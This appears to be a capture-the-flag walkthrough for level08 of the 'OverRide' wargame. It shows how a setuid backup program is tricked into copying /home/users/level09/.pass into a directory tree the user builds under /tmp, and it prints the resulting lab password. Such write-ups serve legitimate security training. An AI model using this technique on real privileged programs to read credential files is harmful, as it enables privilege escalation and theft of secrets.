## WALKTHROUGH - LEVEL08

---

After examining the source code, it opens 3 files, **backups/.log**, **argv[1]**,**backups/ + argv[1]**.  
If we sucessfuly open these three, it will write to
**backups/ + argv[1]** the **content of argv[1]**.  
So if we pass **/home/users/level09/.pass**, it should write the password to
**backups/home/users/levle09/.pass**.

So, if we recreate the same folders in /tmp (for permissions), it should work.  
The payload is as follow :

```sh
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ touch backups/.log
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
